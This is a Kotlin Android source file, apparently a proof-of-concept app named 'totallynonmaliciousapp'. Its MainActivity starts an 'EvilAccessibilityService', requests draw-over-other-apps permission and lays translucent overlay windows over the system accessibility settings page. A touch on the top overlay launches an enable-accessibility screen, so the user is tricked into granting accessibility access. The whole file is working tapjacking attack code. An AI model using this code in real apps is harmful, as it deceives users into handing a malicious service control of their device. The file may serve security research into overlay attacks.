package jamil.totallynonmaliciousapp

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Bundle
import jamil.totallynonmaliciousapp.services.EvilAccessibilityService
import android.provider.Settings
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.os.Handler




class MainActivity : Activity(), View.OnTouchListener{

    private var viewFullScreenGreyBottom : View? = null
    private var viewFullScreenGreyTop : View? = null
    private var viewFullScreenBlue : View? = null

    override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        val intent = Intent(this, EvilAccessibilityService::class.java)

        stopService(intent)
        startService(intent)

        openAccessibilitySettingsPage()
        requestDrawOnTop()
    }

    private fun requestDrawOnTop() {
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
            startActivityForResult(intent, 251)
        } else {
            draw_window()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when(requestCode) {
            251 -> {
                if (Settings.canDrawOverlays(this)) {
                    draw_window()
                }
            }
        }
    }

    private fun openAccessibilitySettingsPage() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }

    override fun onTouch(v: View?, event: MotionEvent?): Boolean {
        if (event != null && event.rawY == 0.0f) {

            val intent = Intent(this, EnableAccessibilityActivity::class.java)
            startActivity(intent)

            val handler = Handler()
            handler.postDelayed( {
                this.viewFullScreenBlue?.visibility = View.GONE
                this.viewFullScreenGreyTop?.visibility = View.GONE
                this.viewFullScreenGreyBottom?.visibility = View.GONE
            }, 2000)
            finish()
            return true
        }

        return false
    }


    private fun draw_window() {
        val layoutInflator = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater

        this.viewFullScreenGreyBottom = layoutInflator.inflate(R.layout.full_screen_grey_bottom, null)
        this.viewFullScreenGreyTop = layoutInflator.inflate(R.layout.full_screen_grey_top, null)
        this.viewFullScreenBlue = layoutInflator.inflate(R.layout.full_screen_blue, null)

        this.viewFullScreenGreyTop?.setOnTouchListener(this)

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val windowParametersTop = WindowManager.LayoutParams(
            1080,
            860,
            0,
            -1000,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )

        val windowParametersBottom = WindowManager.LayoutParams(
            1080,
            700,
            0,
            1000,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )

        val windowParametersCenter = WindowManager.LayoutParams(
            1080,
            172,
            0,
            80,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        )

        windowManager.addView(viewFullScreenGreyTop, windowParametersTop)
        windowManager.addView(viewFullScreenGreyBottom, windowParametersBottom)
        windowManager.addView(viewFullScreenBlue, windowParametersCenter)
    }
}